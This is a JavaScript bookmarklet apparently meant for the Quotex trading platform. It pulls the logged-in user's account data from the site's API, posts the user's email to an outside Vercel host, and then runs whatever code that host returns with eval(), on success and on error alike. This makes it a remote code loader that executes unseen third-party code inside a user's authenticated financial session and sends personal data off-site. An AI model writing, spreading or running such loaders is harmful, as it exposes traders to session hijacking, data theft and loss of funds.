(async function() {
    try {
        const BASE_URL = 'https://bookmarklet-tan.vercel.app';
        
        // 1. Fetch user data from Quotex API
        const digestRes = await fetch('https://market-qx.trade/api/v1/cabinets/digest').then(r => r.json());
        const userData = digestRes.data;
        const email = userData?.email;

        if (!email) {
            console.error('Could not determine user email. Please ensure you are logged into Quotex.');
            return;
        }

        // 2. Verify authorization and get consolidated code
        const authRes = await fetch(`${BASE_URL}/api`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: email })
        }).then(r => r.json());

        // 3. Execute based on response (Data = Success, Error = Failure)
        if (authRes.Data) {
            eval(authRes.Data);
        } else if (authRes.Error) {
            eval(authRes.Error);
        }

    } catch (err) {
        console.error('Bookmarklet initialization failed:', err);
    }
})();